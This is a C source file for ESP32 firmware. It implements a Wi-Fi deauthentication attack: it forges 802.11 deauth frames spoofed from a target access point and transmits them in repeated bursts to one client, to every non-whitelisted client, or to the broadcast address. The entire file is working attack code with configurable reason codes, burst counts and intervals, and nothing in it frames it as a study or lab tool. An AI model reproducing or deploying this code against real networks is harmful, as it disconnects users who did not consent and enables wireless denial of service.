#include "app_state.h"
#include "deauth.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "esp_task_wdt.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include <string.h>

static const char *TAG = "deauth";

#define DEAUTH_DELAY_MS 100

typedef struct __attribute__((packed)) {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
    uint16_t reason_code;
} deauth_frame_t;

static void send_deauth(const uint8_t *ap, const uint8_t *client, uint16_t reason)
{
    deauth_frame_t pkt;
    memset(&pkt, 0, sizeof(pkt));

    pkt.frame_control = 0x00C0;
    pkt.duration      = 0;
    memcpy(pkt.addr1, client, 6);
    memcpy(pkt.addr2, ap, 6);
    memcpy(pkt.addr3, ap, 6);
    pkt.seq_ctrl   = 0;
    pkt.reason_code = reason;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);
    if (err == ESP_OK) {
        s_deauth_count++;
    } else {
        ESP_LOGE(TAG, "TX failed: %s", esp_err_to_name(err));
    }
}

static void deauth_task(void *arg)
{
    uint16_t reason  = s_deauth_reason;
    uint8_t  burst   = s_deauth_burst;
    bool     broadcast = s_deauth_broadcast;
    bool     target_valid = s_target_client_valid;
    uint8_t  target[6];
    memcpy(target, s_target_client, 6);

    while (s_deauth_running) {
        esp_task_wdt_reset();
        if (broadcast && s_whitelist_count == 0) {
            uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
            for (uint8_t i = 0; i < burst && s_deauth_running; i++) {
                send_deauth(s_target_bssid, bcast, reason);
                if (i < burst - 1) vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
            }
        } else if (broadcast) {
            for (int c = 0; c < s_client_count && s_deauth_running; c++) {
                if (is_whitelisted(s_clients[c].mac)) continue;
                for (uint8_t i = 0; i < burst && s_deauth_running; i++) {
                    send_deauth(s_target_bssid, s_clients[c].mac, reason);
                    if (i < burst - 1) vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
                }
            }
        } else if (target_valid) {
            for (uint8_t i = 0; i < burst && s_deauth_running; i++) {
                send_deauth(s_target_bssid, target, reason);
                if (i < burst - 1) vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
            }
        } else {
            for (int c = 0; c < s_client_count && s_deauth_running; c++) {
                if (is_whitelisted(s_clients[c].mac)) continue;
                for (uint8_t i = 0; i < burst && s_deauth_running; i++) {
                    send_deauth(s_target_bssid, s_clients[c].mac, reason);
                    if (i < burst - 1) vTaskDelay(pdMS_TO_TICKS(DEAUTH_DELAY_MS));
                }
            }
        }

        uint16_t delay = s_deauth_interval_ms;
        if (delay < 10) delay = 10;
        vTaskDelay(pdMS_TO_TICKS(delay));
    }

    vTaskDelete(NULL);
}

void deauth_start(uint16_t reason, uint8_t burst, uint16_t interval_ms,
                  const uint8_t *client_mac, bool broadcast)
{
    if (s_deauth_running) {
        deauth_stop();
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    s_deauth_reason      = reason;
    s_deauth_burst       = burst;
    s_deauth_interval_ms = interval_ms;
    s_deauth_broadcast   = broadcast;

    if (client_mac) {
        memcpy(s_target_client, client_mac, 6);
        s_target_client_valid = true;
    } else {
        s_target_client_valid = false;
    }

    s_deauth_running = true;
    xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
}

void deauth_stop(void)
{
    s_deauth_running = false;
}
